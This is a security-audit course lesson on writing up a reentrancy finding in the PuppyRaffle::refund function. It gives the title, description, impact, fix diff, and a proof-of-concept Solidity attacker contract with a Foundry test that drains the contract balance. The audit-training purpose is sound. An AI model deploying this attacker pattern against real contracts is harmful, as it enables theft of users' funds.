---
title: Reporting - Reentrancy
---

_Follow along with this video:_

---

### Reporting Reentrancy

The next finding on our list is `reentrancy`, we finally get to write this up!

We know this is going to be a high, based on everything we went over and all we learnt about this vulnerability. Keeping in mind `<ROOT CAUSE> + <IMPACT>`, lets write a suitable title.

---

**Title:**

```
### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance
```

> **Note:** It's often a good idea to go through the steps of building a PoC to prove an issue before taking the time to write things up. We wrote a test for reentrancy, that we'll be using, earlier.

On to the next parts of the report template.

---

For our description, we want to detail the specifics of the vulnerability, where it's located and the impact it has, using code snippets is a great way to point to trouble areas being discussed.

````

**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that call do we update the `PuppyRaffle::players` array.

```js
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>  payable(msg.sender).sendValue(entranceFee);
@>  players[playerIndex] = address(0);

    emit RaffleRefunded(playerAddress);
}
    ```
````

---

Next up is impact, let's clearly detail the effect of this vulnerability being exploited.

```
**Impact:** All fees paid by raffle entrants could be stolen by a malicious participant.
```

Simple enough.

---

Fortunately we wrote a test for the reentrancy vulnerability earlier, so we can absolutely paste that here. I like to explicitly walk through the steps of the exploit as well.

````
**Proof of Concept:**

1. User enters the raffle
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the PuppyRaffle balance.

<details>
<summary>PoC Code</summary>

Add the following to `PuppyRaffle.t.sol`

    ```js
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}

// test to confirm vulnerability
function testCanGetRefundReentrancy() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
    address attacker = makeAddr("attacker");
    vm.deal(attacker, 1 ether);

    uint256 startingAttackContractBalance = address(attackerContract).balance;
    uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;

    // attack

    vm.prank(attacker);
    attackerContract.attack{value: entranceFee}();

    // impact
    console.log("attackerContract balance: ", startingAttackContractBalance);
    console.log("puppyRaffle balance: ", startingPuppyRaffleBalance);
    console.log("ending attackerContract balance: ", address(attackerContract).balance);
    console.log("ending puppyRaffle balance: ", address(puppyRaffle).balance);
}
    ```
</details>
````

---

Last part - Recommendation. We know this, this protocol should be following CEI.

````
**Recommendation:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally we should move the event emission up as well.

    ```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    +   players[playerIndex] = address(0);
    +   emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFees);
    -   players[playerIndex] = address(0);
    -   emit RaffleRefunded(playerAddress);
    }
    ```
````

---

Great! That's all there is to our `reentrancy` report. Be sure to mark these audit notes as actioned and we'll move on to the next vulnerability!
